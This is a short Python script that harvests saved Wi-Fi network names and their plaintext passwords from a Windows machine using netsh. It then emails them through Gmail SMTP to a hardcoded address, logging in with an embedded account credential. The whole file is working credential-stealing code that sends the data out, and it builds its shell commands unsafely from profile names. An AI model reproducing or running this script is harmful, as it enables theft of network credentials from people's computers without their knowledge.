import subprocess
import smtplib
p = subprocess.Popen('netsh wlan show profiles', shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)

l2 = []
for line in p.stdout.readlines():
 
    try:
        l1 = line.decode('cp1252').split(':')
        if l1[0].strip() == 'All User Profile':
            l2.append(l1[1].strip())
    except Exception:
        l2.append('Error')
l4 = []
for j in l2:
    try:
        cmd = 'netsh wlan show profile name=' + j + ' key=clear'

        p1 = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
        for line in p1.stdout.readlines():
            l3 = line.decode('cp1252')
            if 'Key Content' in l3:
                l4.append((j,l3))
    except Exception:
        l4.append('Error Occured')

retval = p.wait()

message = '\n'
for j in l4:
    message += j[0] + ':'+j[1] + '\n'

sender = 'saliyadinusha99@gmail.com'
receivers = 'dinushasaliya@gmail.com'

server = smtplib.SMTP('smtp.gmail.com',587)
server.starttls()

server.login('saliyadinusha99@gmail.com', 'yhgoeelcfvewyguv')
server.sendmail(sender, receivers, message)